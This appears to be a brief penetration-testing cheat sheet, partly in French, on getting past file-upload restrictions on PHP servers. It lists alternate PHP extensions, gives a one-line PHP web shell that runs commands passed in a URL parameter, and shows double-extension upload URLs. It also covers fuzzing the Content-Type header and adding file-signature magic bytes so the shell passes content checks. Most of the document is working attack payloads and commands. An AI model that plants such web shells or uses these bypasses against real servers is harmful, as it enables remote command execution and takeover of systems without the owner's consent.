## Extensions

```
.php3
.php4
.php5
.php7
.phps
.php-s
.pht
.phar
.phtml
```

```sh
echo '<?php system($_GET["command"]); ?>' > file.ext
```

```sh
# Double Extensions
http://vuln.com/upload/shell.jpg.php?cmd=id

# Reverse Double Extension
http://vuln.com/upload/shell.php.jpg?cmd=id
```

## Type Filters

There are two common methods for validating the file content: `Content-Type Header` or `File Content`.

- We may start by fuzzing the Content-Type header with

```sh
cat /opt/seclists/Miscellaneous/Web/content-type.txt | grep 'image/' > image-content-types.txt
```

## Magic-Numbers

- https://gist.github.com/leommoore/f9e57ba2aa4bf197ebc5

- https://en.wikipedia.org/wiki/List_of_file_signatures


```sh
echo '<?php system($_GET["cmd"]); ?>' > file.php
```

Copier une des signature dans le fichier

```sh
hexeditor file.php
```